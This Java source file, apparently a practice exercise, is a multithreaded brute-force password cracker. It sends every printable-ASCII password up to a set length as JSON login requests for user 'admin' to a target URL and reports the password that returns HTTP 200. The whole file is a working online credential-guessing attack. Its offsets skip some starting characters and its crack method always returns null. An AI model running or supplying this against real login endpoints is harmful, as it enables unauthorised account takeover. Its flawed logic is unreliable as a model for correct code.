package org.example;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.LocalTime;
import java.time.temporal.ChronoUnit;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ThreadedHttpPwCracker implements PwCracker {


    private final HttpClient httpClient;

    public ThreadedHttpPwCracker() {
        this.httpClient = HttpClient.newHttpClient();
    }

    private String recursiveCracker(int offset, String url, int maxLength, int currentLength, byte[] currentPassword) {
        if (currentLength == maxLength) {

            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(new URI(url))
                        .headers("Content-Type", "application/json;charset=UTF-8")
                        .POST(HttpRequest.BodyPublishers.ofString("{\"username\":\"admin\",\"password\":\"" + new String(currentPassword) + "\"}"))
                        .build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) {
                    return new String(currentPassword);
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            return null;
        }

        for (int i = currentLength == 0 ? 33 + offset : 33; i < (currentLength == 0 ? 33 + offset + 20 : 126); i++) {
            currentPassword[currentLength] = (byte) i;
            String result = recursiveCracker(offset, url, maxLength, currentLength + 1, currentPassword);
            if (result != null) {
                return result;
            }
        }

        return null;
    }



    public String crack(int maxLength, String url) {
        ExecutorService executor = Executors.newFixedThreadPool(3);

        executor.submit(() -> {
            LocalTime start = LocalTime.now();

            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                String result = recursiveCracker(0, url, length, 0, passwordBytes);
                if (result != null) {
                    LocalTime end = LocalTime.now();
                    System.out.println(start.until(end, ChronoUnit.SECONDS) + " seconds");
                    System.out.println("Password found: " + result);
                    executor.shutdownNow();
                }
            }
            return "Not found";
        });

        executor.submit(() -> {
            LocalTime start = LocalTime.now();

            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                String result = recursiveCracker(20, url, length, 0, passwordBytes);
                if (result != null) {
                    LocalTime end = LocalTime.now();
                    System.out.println(start.until(end, ChronoUnit.SECONDS) + " seconds");
                    System.out.println("Password found: " + result);
                    executor.shutdownNow();
                }
            }
            return "Not found";
        });

        executor.submit(() -> {
            LocalTime start = LocalTime.now();

            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                String result = recursiveCracker(40, url, length, 0, passwordBytes);
                if (result != null) {
                    LocalTime end = LocalTime.now();
                    System.out.println(start.until(end, ChronoUnit.SECONDS) + " seconds");
                    System.out.println("Password found: " + result);
                    executor.shutdownNow();
                }
            }
            return "Not found";
        });

        executor.submit(() -> {
            LocalTime start = LocalTime.now();

            for (int length = 1; length <= maxLength; length++) {
                byte[] passwordBytes = new byte[length];
                String result = recursiveCracker(60, url, length, 0, passwordBytes);
                if (result != null) {
                    LocalTime end = LocalTime.now();
                    System.out.println(start.until(end, ChronoUnit.SECONDS) + " seconds");
                    System.out.println("Password found: " + result);
                    executor.shutdownNow();
                }
            }
            return "Not found";
        });


        return null;
    }
}
